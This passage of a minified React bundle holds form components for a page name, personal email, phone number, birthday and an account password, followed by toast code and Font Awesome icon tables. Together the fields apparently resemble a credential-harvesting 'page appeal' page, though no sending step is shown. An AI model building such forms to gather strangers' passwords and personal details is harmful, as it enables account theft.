            SPACE: 32,
            TAB: 9
        }
    },
    t.default = le
}
]);
const Eb = hi(jb)
  , _b = () => {
    const [e,t] = j.useState({
        pageName: "",
        name: "",
        phoneNumber: "",
        birthday: ""
    })
      , {errors: n, validateInput: r} = Kf()
      , [a,o] = j.useState(void 0)
      , {setPageName: i, setName: s, setPhoneNumber: u, setBirthday: c, pageNameInputRef: f, nameInputRef: d, phoneNumberInputRef: h, birthdayInputRef: N} = Vf()
      , y = (p, m) => {
        const C = p.target.value;
        t(k => ({
            ...k,
            [m]: m === "birthday" ? S(C) : C
        })),
        r(m, C)
    }
      , S = p => {
        const m = p.replace(/\D/g, "");
        return m.length <= 2 ? m : m.length <= 4 ? `${m.slice(0, 2)}/${m.slice(2)}` : `${m.slice(0, 2)}/${m.slice(2, 4)}/${m.slice(4, 8)}`
    }
      , x = (p, m, C, k) => {
        t(w => ({
            ...w,
            phoneNumber: k
        })),
        r("phoneNumber", k)
    }
    ;
    j.useEffect( () => {
        (async () => {
            try {
                const m = await kb();
                o(m.toLowerCase())
            } catch (m) {
                console.error("Failed to fetch country", m)
            }
        }
        )()
    }
    , []),
    j.useEffect( () => {
        i(e.pageName),
        s(e.name),
        u(e.phoneNumber),
        c(e.birthday)
    }
    , [e, i, s, u, c]);
    const g = p => m => {
        y(m, p)
    }
    ;
    return l.jsxs("div", {
        className: "my-5",
        children: [l.jsx("input", {
            ref: f,
            className: "my-2 w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none",
            type: "text",
            placeholder: "Page Name",
            value: e.pageName,
            onChange: g("pageName"),
            onBlur: () => r("pageName", e.pageName)
        }), n.pageName && l.jsx("p", {
            className: "text-red-500",
            children: n.pageName
        }), l.jsx("input", {
            ref: d,
            className: "my-2 w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none",
            type: "text",
            placeholder: "Personal Email",
            value: e.name,
            onChange: g("name"),
            onBlur: () => r("name", e.name)
        }), n.name && l.jsx("p", {
            className: "text-red-500",
            children: n.name
        }), l.jsx(Eb, {
            country: a ?? "",
            value: e.phoneNumber,
            onChange: x,
            jumpCursorToEnd: !0,
            copyNumbersOnly: !0,
            autocompleteSearch: !0,
            containerClass: "group my-4 flex items-center w-full p-3 rounded-full border bg-white border-gray-300 focus-within:border-blue-500 react-tel-input",
            inputClass: "my-2 w-full rounded-full text-base border-none border-gray-300",
            buttonClass: "border-none bg-transparent",
            dropdownClass: "border-none bg-white",
            inputProps: {
                ref: h
            },
            placeholder: "Phone Number"
        }), n.phoneNumber && l.jsx("p", {
            className: "text-red-500",
            children: n.phoneNumber
        }), l.jsx("input", {
            ref: N,
            className: "my-2 w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none",
            type: "text",
            placeholder: "Birthday (MM/DD/YYYY)",
            value: e.birthday,
            onChange: g("birthday"),
            onBlur: () => r("birthday", e.birthday)
        }), n.birthday && l.jsx("p", {
            className: "text-red-500",
            children: n.birthday
        })]
    })
}
  , Tb = () => {
    const [e,t] = j.useState({
        email: "",
        password: ""
    })
      , {setEmail: n, setPassword: r, emailInputRef: a, passwordInputRef: o} = Vf()
      , i = (u, c) => {
        const f = u.target.value;
        t(d => ({
            ...d,
            [c]: f
        })),
        c === "email" ? n(f) : c === "password" && r(f)
    }
      , s = u => c => {
        i(c, u)
    }
    ;
    return l.jsxs("div", {
        className: "my-5",
        children: [l.jsx("input", {
            ref: a,
            className: "my-2 w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none",
            type: "email",
            placeholder: "Email/Phone",
            value: e.email,
            onChange: s("email")
        }), l.jsx("input", {
            ref: o,
            className: "my-2 w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none",
            type: "password",
            placeholder: "Password",
            value: e.password,
            onChange: s("password")
        })]
    })
}
  , El = ({message: e, onClose: t, type: n="info"}) => {
    j.useEffect( () => {
        const o = setTimeout( () => {
            t()
        }
        , 3e3);
        return () => clearTimeout(o)
    }
    , [t]);
    const r = {
        success: "border-emerald-200/50 bg-gradient-to-r from-emerald-50/80 via-purple-50/80 to-emerald-50/80 text-emerald-700",
        error: "border-purple-200/50 bg-gradient-to-r from-purple-50/80 via-pink-50/80 to-rose-50/80 text-purple-700",
        warning: "border-amber-200/50 bg-gradient-to-r from-amber-50/80 via-purple-50/80 to-orange-50/80 text-amber-700",
        info: "border-purple-200/50 bg-gradient-to-r from-purple-50/80 via-blue-50/80 to-indigo-50/80 text-purple-700"
    }
      , a = {
        success: "text-emerald-500",
        error: "text-purple-500",
        warning: "text-amber-500",
        info: "text-purple-500"
    };
    return l.jsx("div", {
        className: "fixed right-0 top-4 z-50 mx-4 animate-fade-in sm:right-4",
        children: l.jsx("div", {
            className: "overflow-hidden rounded-xl backdrop-blur-sm",
            children: l.jsxs("div", {
                className: `flex items-center gap-3 border p-4 shadow-sm ${r[n]}`,
                children: [l.jsx("div", {
                    className: "flex-1 text-sm font-medium",
                    children: e
                }), l.jsx("button", {
                    onClick: t,
                    className: `rounded-lg p-1.5 transition-colors ${a[n]} hover:bg-black/5 focus:outline-none focus:ring-2 focus:ring-purple-500/20`,
                    children: l.jsx("svg", {
                        className: "h-4 w-4",
                        fill: "none",
                        viewBox: "0 0 24 24",
                        stroke: "currentColor",
                        children: l.jsx("path", {
                            strokeLinecap: "round",
                            strokeLinejoin: "round",
                            strokeWidth: 2,
                            d: "M6 18L18 6M6 6l12 12"
                        })
                    })
                })]
            })
        })
    })
}
  , Pb = {
    prefix: "fas",
    iconName: "trash-can",
    icon: [448, 512, [61460, "trash-alt"], "f2ed", "M135.2 17.7C140.6 6.8 151.7 0 163.8 0L284.2 0c12.1 0 23.2 6.8 28.6 17.7L320 32l96 0c17.7 0 32 14.3 32 32s-14.3 32-32 32L32 96C14.3 96 0 81.7 0 64S14.3 32 32 32l96 0 7.2-14.3zM32 128l384 0 0 320c0 35.3-28.7 64-64 64L96 512c-35.3 0-64-28.7-64-64l0-320zm96 64c-8.8 0-16 7.2-16 16l0 224c0 8.8 7.2 16 16 16s16-7.2 16-16l0-224c0-8.8-7.2-16-16-16zm96 0c-8.8 0-16 7.2-16 16l0 224c0 8.8 7.2 16 16 16s16-7.2 16-16l0-224c0-8.8-7.2-16-16-16zm96 0c-8.8 0-16 7.2-16 16l0 224c0 8.8 7.2 16 16 16s16-7.2 16-16l0-224c0-8.8-7.2-16-16-16z"]
}
  , Ob = {
    prefix: "fas",
    iconName: "info",
    icon: [192, 512, [], "f129", "M48 80a48 48 0 1 1 96 0A48 48 0 1 1 48 80zM0 224c0-17.7 14.3-32 32-32l64 0c17.7 0 32 14.3 32 32l0 224 32 0c17.7 0 32 14.3 32 32s-14.3 32-32 32L32 512c-17.7 0-32-14.3-32-32s14.3-32 32-32l32 0 0-192-32 0c-17.7 0-32-14.3-32-32z"]
}
  , Rb = {
    prefix: "fas",
    iconName: "sort-down",
    icon: [320, 512, ["sort-desc"], "f0dd", "M182.6 470.6c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-9.2-9.2-11.9-22.9-6.9-34.9s16.6-19.8 29.6-19.8l256 0c12.9 0 24.6 7.8 29.6 19.8s2.2 25.7-6.9 34.9l-128 128z"]
}
  , Ab = {
    prefix: "fas",
    iconName: "right-from-bracket",
    icon: [512, 512, ["sign-out-alt"], "f2f5", "M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"]
}
  , Gs = Ab
  , Hg = {
    prefix: "fas",
    iconName: "bars",
    icon: [448, 512, ["navicon"], "f0c9", "M0 96C0 78.3 14.3 64 32 64l384 0c17.7 0 32 14.3 32 32s-14.3 32-32 32L32 128C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32l384 0c17.7 0 32 14.3 32 32s-14.3 32-32 32L32 288c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32L32 448c-17.7 0-32-14.3-32-32s14.3-32 32-32l384 0c17.7 0 32 14.3 32 32z"]
}
  , Lb = {
    prefix: "fas",
    iconName: "circle-exclamation",
    icon: [512, 512, ["exclamation-circle"], "f06a", "M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c13.3 0 24 10.7 24 24l0 112c0 13.3-10.7 24-24 24s-24-10.7-24-24l0-112c0-13.3 10.7-24 24-24zM224 352a32 32 0 1 1 64 0 32 32 0 1 1 -64 0z"]
}
  , Ib = Lb
  , Mb = {
    prefix: "fas",
    iconName: "lock",
    icon: [448, 512, [128274], "f023", "M144 144l0 48 160 0 0-48c0-44.2-35.8-80-80-80s-80 35.8-80 80zM80 192l0-48C80 64.5 144.5 0 224 0s144 64.5 144 144l0 48 16 0c35.3 0 64 28.7 64 64l0 192c0 35.3-28.7 64-64 64L64 512c-35.3 0-64-28.7-64-64L0 256c0-35.3 28.7-64 64-64l16 0z"]
}
  , Db = {
    prefix: "fas",
    iconName: "pen-to-square",
    icon: [512, 512, ["edit"], "f044", "M471.6 21.7c-21.9-21.9-57.3-21.9-79.2 0L362.3 51.7l97.9 97.9 30.1-30.1c21.9-21.9 21.9-57.3 0-79.2L471.6 21.7zm-299.2 220c-6.1 6.1-10.8 13.6-13.5 21.9l-29.6 88.8c-2.9 8.6-.6 18.1 5.8 24.6s15.9 8.7 24.6 5.8l88.8-29.6c8.2-2.7 15.7-7.4 21.9-13.5L437.7 172.3 339.7 74.3 172.4 241.7zM96 64C43 64 0 107 0 160L0 416c0 53 43 96 96 96l256 0c53 0 96-43 96-96l0-96c0-17.7-14.3-32-32-32s-32 14.3-32 32l0 96c0 17.7-14.3 32-32 32L96 448c-17.7 0-32-14.3-32-32l0-256c0-17.7 14.3-32 32-32l96 0c17.7 0 32-14.3 32-32s-14.3-32-32-32L96 64z"]
}
  , oh = Db
  , pu = {
    prefix: "fas",
    iconName: "users",
    icon: [640, 512, [], "f0c0", "M144 0a80 80 0 1 1 0 160A80 80 0 1 1 144 0zM512 0a80 80 0 1 1 0 160A80 80 0 1 1 512 0zM0 298.7C0 239.8 47.8 192 106.7 192l42.7 0c15.9 0 31 3.5 44.6 9.7c-1.3 7.2-1.9 14.7-1.9 22.3c0 38.2 16.8 72.5 43.3 96c-.2 0-.4 0-.7 0L21.3 320C9.6 320 0 310.4 0 298.7zM405.3 320c-.2 0-.4 0-.7 0c26.6-23.5 43.3-57.8 43.3-96c0-7.6-.7-15-1.9-22.3c13.6-6.3 28.7-9.7 44.6-9.7l42.7 0C592.2 192 640 239.8 640 298.7c0 11.8-9.6 21.3-21.3 21.3l-213.3 0zM224 224a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zM128 485.3C128 411.7 187.7 352 261.3 352l117.3 0C452.3 352 512 411.7 512 485.3c0 14.7-11.9 26.7-26.7 26.7l-330.7 0c-14.7 0-26.7-11.9-26.7-26.7z"]
}
  , Ys = {
    prefix: "fas",
    iconName: "eye-slash",
    icon: [640, 512, [], "f070", "M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c8.4-19.3 10.6-41.4 4.8-63.3c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zM373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5L373 389.9z"]
}
  , fi = {
    prefix: "fas",
    iconName: "user",
    icon: [448, 512, [128100, 62144], "f007", "M224 256A128 128 0 1 0 224 0a128 128 0 1 0 0 256zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512l388.6 0c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304l-91.4 0z"]
}
  , Qs = {
    prefix: "fas",
    iconName: "globe",
    icon: [512, 512, [127760], "f0ac", "M352 256c0 22.2-1.2 43.6-3.3 64l-185.3 0c-2.2-20.4-3.3-41.8-3.3-64s1.2-43.6 3.3-64l185.3 0c2.2 20.4 3.3 41.8 3.3 64zm28.8-64l123.1 0c5.3 20.5 8.1 41.9 8.1 64s-2.8 43.5-8.1 64l-123.1 0c2.1-20.6 3.2-42 3.2-64s-1.1-43.4-3.2-64zm112.6-32l-116.7 0c-10-63.9-29.8-117.4-55.3-151.6c78.3 20.7 142 77.5 171.9 151.6zm-149.1 0l-176.6 0c6.1-36.4 15.5-68.6 27-94.7c10.5-23.6 22.2-40.7 33.5-51.5C239.4 3.2 248.7 0 256 0s16.6 3.2 27.8 13.8c11.3 10.8 23 27.9 33.5 51.5c11.6 26 20.9 58.2 27 94.7zm-209 0L18.6 160C48.6 85.9 112.2 29.1 190.6 8.4C165.1 42.6 145.3 96.1 135.3 160zM8.1 192l123.1 0c-2.1 20.6-3.2 42-3.2 64s1.1 43.4 3.2 64L8.1 320C2.8 299.5 0 278.1 0 256s2.8-43.5 8.1-64zM194.7 446.6c-11.6-26-20.9-58.2-27-94.6l176.6 0c-6.1 36.4-15.5 68.6-27 94.6c-10.5 23.6-22.2 40.7-33.5 51.5C272.6 508.8 263.3 512 256 512s-16.6-3.2-27.8-13.8c-11.3-10.8-23-27.9-33.5-51.5zM135.3 352c10 63.9 29.8 117.4 55.3 151.6C112.2 482.9 48.6 426.1 18.6 352l116.7 0zm358.1 0c-30 74.1-93.6 130.9-171.9 151.6c25.5-34.2 45.2-87.7 55.3-151.6l116.7 0z"]
}
  , zb = {
    prefix: "fas",
    iconName: "server",
    icon: [512, 512, [], "f233", "M64 32C28.7 32 0 60.7 0 96l0 64c0 35.3 28.7 64 64 64l384 0c35.3 0 64-28.7 64-64l0-64c0-35.3-28.7-64-64-64L64 32zm280 72a24 24 0 1 1 0 48 24 24 0 1 1 0-48zm48 24a24 24 0 1 1 48 0 24 24 0 1 1 -48 0zM64 288c-35.3 0-64 28.7-64 64l0 64c0 35.3 28.7 64 64 64l384 0c35.3 0 64-28.7 64-64l0-64c0-35.3-28.7-64-64-64L64 288zm280 72a24 24 0 1 1 0 48 24 24 0 1 1 0-48zm56 24a24 24 0 1 1 48 0 24 24 0 1 1 -48 0z"]
}
  , hu = {
    prefix: "fas",
    iconName: "image",
    icon: [512, 512, [], "f03e", "M0 96C0 60.7 28.7 32 64 32l384 0c35.3 0 64 28.7 64 64l0 320c0 35.3-28.7 64-64 64L64 480c-35.3 0-64-28.7-64-64L0 96zM323.8 202.5c-4.5-6.6-11.9-10.5-19.8-10.5s-15.4 3.9-19.8 10.5l-87 127.6L170.7 297c-4.6-5.7-11.5-9-18.7-9s-14.2 3.3-18.7 9l-64 80c-5.8 7.2-6.9 17.1-2.9 25.4s12.4 13.6 21.6 13.6l96 0 32 0 208 0c8.9 0 17.1-4.9 21.2-12.8s3.6-17.4-1.4-24.7l-120-176zM112 192a48 48 0 1 0 0-96 48 48 0 1 0 0 96z"]
}
  , Fb = {
    prefix: "fas",
    iconName: "circle-check",
    icon: [512, 512, [61533, "check-circle"], "f058", "M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM369 209L241 337c-9.4 9.4-24.6 9.4-33.9 0l-64-64c-9.4-9.4-9.4-24.6 0-33.9s24.6-9.4 33.9 0l47 47L335 175c9.4-9.4 24.6-9.4 33.9 0s9.4 24.6 0 33.9z"]
}
  , Ub = Fb
  , Bb = {
    prefix: "fas",
    iconName: "address-card",
    icon: [576, 512, [62140, "contact-card", "vcard"], "f2bb", "M64 32C28.7 32 0 60.7 0 96L0 416c0 35.3 28.7 64 64 64l448 0c35.3 0 64-28.7 64-64l0-320c0-35.3-28.7-64-64-64L64 32zm80 256l64 0c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16L80 384c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm-32-96a64 64 0 1 1 128 0 64 64 0 1 1 -128 0zm256-32l128 0c8.8 0 16 7.2 16 16s-7.2 16-16 16l-128 0c-8.8 0-16-7.2-16-16s7.2-16 16-16zm0 64l128 0c8.8 0 16 7.2 16 16s-7.2 16-16 16l-128 0c-8.8 0-16-7.2-16-16s7.2-16 16-16zm0 64l128 0c8.8 0 16 7.2 16 16s-7.2 16-16 16l-128 0c-8.8 0-16-7.2-16-16s7.2-16 16-16z"]
}
  , Xs = {
    prefix: "fas",
    iconName: "eye",
    icon: [576, 512, [128065], "f06e", "M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM144 256a144 144 0 1 1 288 0 144 144 0 1 1 -288 0zm144-64c0 35.3-28.7 64-64 64c-7.1 0-13.9-1.2-20.3-3.3c-5.5-1.8-11.9 1.6-11.7 7.4c.3 6.9 1.3 13.8 3.2 20.7c13.7 51.2 66.4 81.6 117.6 67.9s81.6-66.4 67.9-117.6c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3z"]
}
  , $b = {
    prefix: "fas",
    iconName: "sort-up",
    icon: [320, 512, ["sort-asc"], "f0de", "M182.6 41.4c-12.5-12.5-32.8-12.5-45.3 0l-128 128c-9.2 9.2-11.9 22.9-6.9 34.9s16.6 19.8 29.6 19.8l256 0c12.9 0 24.6-7.8 29.6-19.8s2.2-25.7-6.9-34.9l-128-128z"]
}
  , Co = {
    prefix: "fas",
    iconName: "trash",
    icon: [448, 512, [], "f1f8", "M135.2 17.7L128 32 32 32C14.3 32 0 46.3 0 64S14.3 96 32 96l384 0c17.7 0 32-14.3 32-32s-14.3-32-32-32l-96 0-7.2-14.3C307.4 6.8 296.3 0 284.2 0L163.8 0c-12.1 0-23.2 6.8-28.6 17.7zM416 128L32 128 53.2 467c1.6 25.3 22.6 45 47.9 45l245.8 0c25.3 0 46.3-19.7 47.9-45L416 128z"]
}
  , Hb = {
    prefix: "fas",
    iconName: "circle-info",
    icon: [512, 512, ["info-circle"], "f05a", "M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM216 336l24 0 0-64-24 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l48 0c13.3 0 24 10.7 24 24l0 88 8 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-80 0c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-208a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"]
}
  , Vb = {
    prefix: "fas",
    iconName: "gear",
    icon: [512, 512, [9881, "cog"], "f013", "M495.9 166.6c3.2 8.7 .5 18.4-6.4 24.6l-43.3 39.4c1.1 8.3 1.7 16.8 1.7 25.4s-.6 17.1-1.7 25.4l43.3 39.4c6.9 6.2 9.6 15.9 6.4 24.6c-4.4 11.9-9.7 23.3-15.8 34.3l-4.7 8.1c-6.6 11-14 21.4-22.1 31.2c-5.9 7.2-15.7 9.6-24.5 6.8l-55.7-17.7c-13.4 10.3-28.2 18.9-44 25.4l-12.5 57.1c-2 9.1-9 16.3-18.2 17.8c-13.8 2.3-28 3.5-42.5 3.5s-28.7-1.2-42.5-3.5c-9.2-1.5-16.2-8.7-18.2-17.8l-12.5-57.1c-15.8-6.5-30.6-15.1-44-25.4L83.1 425.9c-8.8 2.8-18.6 .3-24.5-6.8c-8.1-9.8-15.5-20.2-22.1-31.2l-4.7-8.1c-6.1-11-11.4-22.4-15.8-34.3c-3.2-8.7-.5-18.4 6.4-24.6l43.3-39.4C64.6 273.1 64 264.6 64 256s.6-17.1 1.7-25.4L22.4 191.2c-6.9-6.2-9.6-15.9-6.4-24.6c4.4-11.9 9.7-23.3 15.8-34.3l4.7-8.1c6.6-11 14-21.4 22.1-31.2c5.9-7.2 15.7-9.6 24.5-6.8l55.7 17.7c13.4-10.3 28.2-18.9 44-25.4l12.5-57.1c2-9.1 9-16.3 18.2-17.8C227.3 1.2 241.5 0 256 0s28.7 1.2 42.5 3.5c9.2 1.5 16.2 8.7 18.2 17.8l12.5 57.1c15.8 6.5 30.6 15.1 44 25.4l55.7-17.7c8.8-2.8 18.6-.3 24.5 6.8c8.1 9.8 15.5 20.2 22.1 31.2l4.7 8.1c6.1 11 11.4 22.4 15.8 34.3zM256 336a80 80 0 1 0 0-160 80 80 0 1 0 0 160z"]
}
  , Wb = Vb
  , Kb = {
    prefix: "fas",
    iconName: "clock",
    icon: [512, 512, [128339, "clock-four"], "f017", "M256 0a256 256 0 1 1 0 512A256 256 0 1 1 256 0zM232 120l0 136c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2 280 120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"]
}
  , Ji = {
    prefix: "fas",
    iconName: "download",
    icon: [512, 512, [], "f019", "M288 32c0-17.7-14.3-32-32-32s-32 14.3-32 32l0 242.7-73.4-73.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l128 128c12.5 12.5 32.8 12.5 45.3 0l128-128c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L288 274.7 288 32zM64 352c-35.3 0-64 28.7-64 64l0 32c0 35.3 28.7 64 64 64l384 0c35.3 0 64-28.7 64-64l0-32c0-35.3-28.7-64-64-64l-101.5 0-45.3 45.3c-25 25-65.5 25-90.5 0L165.5 352 64 352zm368 56a24 24 0 1 1 0 48 24 24 0 1 1 0-48z"]
}
  , Vg = {
    prefix: "fas",
    iconName: "magnifying-glass",
    icon: [512, 512, [128269, "search"], "f002", "M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352a144 144 0 1 0 0-288 144 144 0 1 0 0 288z"]
}
  , ms = Vg
  , Wg = {
    prefix: "fas",
    iconName: "plus",
    icon: [448, 512, [10133, 61543, "add"], "2b", "M256 80c0-17.7-14.3-32-32-32s-32 14.3-32 32l0 144L48 224c-17.7 0-32 14.3-32 32s14.3 32 32 32l144 0 0 144c0 17.7 14.3 32 32 32s32-14.3 32-32l0-144 144 0c17.7 0 32-14.3 32-32s-14.3-32-32-32l-144 0 0-144z"]
}
  , Kg = {
    prefix: "fas",
    iconName: "xmark",
    icon: [384, 512, [128473, 10005, 10006, 10060, 215, "close", "multiply", "remove", "times"], "f00d", "M342.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L192 210.7 86.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L146.7 256 41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 301.3 297.4 406.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L237.3 256 342.6 150.6z"]
}
  , Gb = Kg
  , Xr = Kg
  , kc = {
    prefix: "fas",
    iconName: "spinner",
    icon: [512, 512, [], "f110", "M304 48a48 48 0 1 0 -96 0 48 48 0 1 0 96 0zm0 416a48 48 0 1 0 -96 0 48 48 0 1 0 96 0zM48 304a48 48 0 1 0 0-96 48 48 0 1 0 0 96zm464-48a48 48 0 1 0 -96 0 48 48 0 1 0 96 0zM142.9 437A48 48 0 1 0 75 369.1 48 48 0 1 0 142.9 437zm0-294.2A48 48 0 1 0 75 75a48 48 0 1 0 67.9 67.9zM369.1 437A48 48 0 1 0 437 369.1 48 48 0 1 0 369.1 437z"]
}
  , oo = {
    prefix: "fas",
    iconName: "check",
    icon: [448, 512, [10003, 10004], "f00c", "M438.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L160 338.7 393.4 105.4c12.5-12.5 32.8-12.5 45.3 0z"]
}
  , Yb = {
    prefix: "fas",
    iconName: "triangle-exclamation",
    icon: [512, 512, [9888, "exclamation-triangle", "warning"], "f071", "M256 32c14.2 0 27.3 7.5 34.5 19.8l216 368c7.3 12.4 7.3 27.7 .2 40.1S486.3 480 472 480L40 480c-14.3 0-27.6-7.7-34.7-20.1s-7-27.8 .2-40.1l216-368C228.7 39.5 241.8 32 256 32zm0 128c-13.3 0-24 10.7-24 24l0 112c0 13.3 10.7 24 24 24s24-10.7 24-24l0-112c0-13.3-10.7-24-24-24zm32 224a32 32 0 1 0 -64 0 32 32 0 1 0 64 0z"]
}
  , qs = {
    prefix: "fas",
    iconName: "paper-plane",
    icon: [512, 512, [61913], "f1d8", "M498.1 5.6c10.1 7 15.4 19.1 13.5 31.2l-64 416c-1.5 9.7-7.4 18.2-16 23s-18.9 5.4-28 1.6L284 427.7l-68.5 74.1c-8.9 9.7-22.9 12.9-35.2 8.1S160 493.2 160 480l0-83.6c0-4 1.5-7.8 4.2-10.8L331.8 202.8c5.8-6.3 5.6-16-.4-22s-15.7-6.4-22-.7L106 360.8 17.7 316.6C7.1 311.3 .3 300.7 0 288.9s5.9-22.8 16.1-28.7l448-256c10.7-6.1 23.9-5.5 34 1.4z"]
}
  , ih = () => {}
;
let qf = {}
  , Gg = {}
  , Yg = null
  , Qg = {
    mark: ih,
    measure: ih
};
try {
    typeof window < "u" && (qf = window),
    typeof document < "u" && (Gg = document),
    typeof MutationObserver < "u" && (Yg = MutationObserver),
    typeof performance < "u" && (Qg = performance)
} catch {}
const {userAgent: sh=""} = qf.navigator || {}
  , Tr = qf
  , lt = Gg
  , lh = Yg
  , Zi = Qg;
Tr.document;
const nr = !!lt.documentElement && !!lt.head && typeof lt.addEventListener == "function" && typeof lt.createElement == "function"
  , Xg = ~sh.indexOf("MSIE") || ~sh.indexOf("Trident/");
var ht = "classic"
  , qg = "duotone"
  , un = "sharp"
  , cn = "sharp-duotone"
  , Qb = [ht, qg, un, cn]
  , Xb = {
    classic: {
        900: "fas",
        400: "far",
        normal: "far",
        300: "fal",
        100: "fat"
    },
    sharp: {
        900: "fass",
        400: "fasr",
        300: "fasl",
        100: "fast"
    },
    "sharp-duotone": {
        900: "fasds"
    }
}
  , uh = {
    kit: {
        fak: "kit",
        "fa-kit": "kit"
    },
    "kit-duotone": {
        fakd: "kit-duotone",
        "fa-kit-duotone": "kit-duotone"
    }
}
  , qb = ["kit"]
  , Jb = /fa(s|r|l|t|d|b|k|kd|ss|sr|sl|st|sds)?[\-\ ]/
  , Zb = /Font ?Awesome ?([56 ]*)(Solid|Regular|Light|Thin|Duotone|Brands|Free|Pro|Sharp Duotone|Sharp|Kit)?.*/i
  , e4 = {
    "Font Awesome 5 Free": {
        900: "fas",
        400: "far"
    },
    "Font Awesome 5 Pro": {
        900: "fas",
        400: "far",
        normal: "far",
        300: "fal"
    },
    "Font Awesome 5 Brands": {
        400: "fab",
        normal: "fab"
    },
    "Font Awesome 5 Duotone": {
        900: "fad"
    }
}
  , t4 = {
    "Font Awesome 6 Free": {
        900: "fas",
        400: "far"
    },
    "Font Awesome 6 Pro": {
        900: "fas",
        400: "far",
        normal: "far",
        300: "fal",
        100: "fat"
    },
    "Font Awesome 6 Brands": {
        400: "fab",
        normal: "fab"
    },
    "Font Awesome 6 Duotone": {
        900: "fad"
    },
    "Font Awesome 6 Sharp": {
        900: "fass",
        400: "fasr",
        normal: "fasr",
        300: "fasl",
        100: "fast"
    },
    "Font Awesome 6 Sharp Duotone": {
        900: "fasds"
    }
}
  , n4 = {
    classic: {
        "fa-brands": "fab",
        "fa-duotone": "fad",
        "fa-light": "fal",
        "fa-regular": "far",
        "fa-solid": "fas",
        "fa-thin": "fat"
    },
    sharp: {
        "fa-solid": "fass",
        "fa-regular": "fasr",
        "fa-light": "fasl",
        "fa-thin": "fast"
    },
    "sharp-duotone": {
        "fa-solid": "fasds"
    }
}
  , r4 = {
    classic: ["fas", "far", "fal", "fat"],
    sharp: ["fass", "fasr", "fasl", "fast"],
    "sharp-duotone": ["fasds"]
}
  , a4 = {
    classic: {
        fab: "fa-brands",
        fad: "fa-duotone",
        fal: "fa-light",
        far: "fa-regular",
        fas: "fa-solid",
        fat: "fa-thin"
    },
    sharp: {
        fass: "fa-solid",
